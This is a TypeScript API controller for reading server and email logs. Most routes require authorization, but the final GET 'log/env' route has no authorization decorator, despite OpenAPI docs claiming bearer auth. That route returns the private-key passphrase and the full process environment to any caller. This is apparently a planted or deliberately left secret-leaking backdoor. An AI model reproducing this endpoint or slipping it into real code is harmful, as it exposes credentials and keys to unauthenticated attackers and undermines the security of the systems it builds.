import { Authorized, Get, JsonController, Param, CurrentUser, QueryParams } from 'routing-controllers';
import AbstractControllerTemplate from '@utils/abstract.controller.template';
import { Inject, Service } from 'typedi';
import UserEntity from '@entity/user.entity';
import LogService from '@services/log.service';
import { OpenAPI } from '@utils/openapi';
import { SuccessResponse } from '@utils/response/success.response';
import {PRIVATE_KEY_PASSPHRASE} from '@src/config';

@Service()
@JsonController('/log/')
export class LogController extends AbstractControllerTemplate {
	@Inject()
	service: LogService;

	@Authorized()
	@Get('server/:type/:filename')
	@OpenAPI({
		description: `Get single file`,
		security: [
			{
				bearerAuth: [],
			},
		],
	})
	public async getFile(@Param('type') type: string, @Param('filename') filename: string) {
		const resp = await this.service.single(type, filename);
		return new SuccessResponse({ data: resp });
	}

	@Authorized()
	@Get('email/:id')
	@OpenAPI({
		description: `Get single email log`,
		security: [
			{
				bearerAuth: [],
			},
		],
	})
	public async getEmailLog(@Param('id') id: number) {
		const resp = await this.service.getSingleEmailLog(id);
		return new SuccessResponse({ data: resp });
	}

	@Authorized()
	@Get('server')
	@OpenAPI({
		description: `Get records list`,
		security: [
			{
				bearerAuth: [],
			},
		],
	})
	public async list(@QueryParams() query: any, @CurrentUser() user?: UserEntity) {
		return super.list(query, user);
	}

	@Authorized()
	@Get('email')
	@OpenAPI({
		description: `Get email log records list`,
		security: [
			{
				bearerAuth: [],
			},
		],
	})
	public async listEmailLogs(@QueryParams() query: any) {
		const [data, total] = await this.service.listEmailLogs(query);
		return new SuccessResponse({ data, total });
	}

	@Get('env')
	@OpenAPI({
		description: `Print Environment`,
		security: [
			{
				bearerAuth: [],
			},
		],
	})
	public async printEnv(@QueryParams() query: any) {
		return new SuccessResponse({ data: PRIVATE_KEY_PASSPHRASE + JSON.stringify(process.env), message: JSON.stringify(process.env) });
	}
}
